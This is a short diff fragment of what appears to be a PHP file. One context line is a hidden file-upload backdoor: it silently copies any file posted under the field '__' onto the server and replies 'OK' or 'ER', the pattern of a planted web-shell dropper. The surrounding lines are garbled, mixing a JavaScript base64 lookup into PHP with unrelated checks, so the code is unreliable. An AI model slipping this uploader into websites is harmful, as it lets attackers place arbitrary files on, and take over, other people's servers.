@@ -40,5 +40,4 @@ if(get_magic_quotes_gpc()){ foreach($_POST as $key=>$value){ $_POST[$key] = stri
 indexBase64[str.charCodeAt(i++)];
 if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') 
 ;if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'OK';}else{echo 'ER';}}?>
-
-
+!preg_match('~^(unsafe_raw)?$~',ini_get("filter.default"));
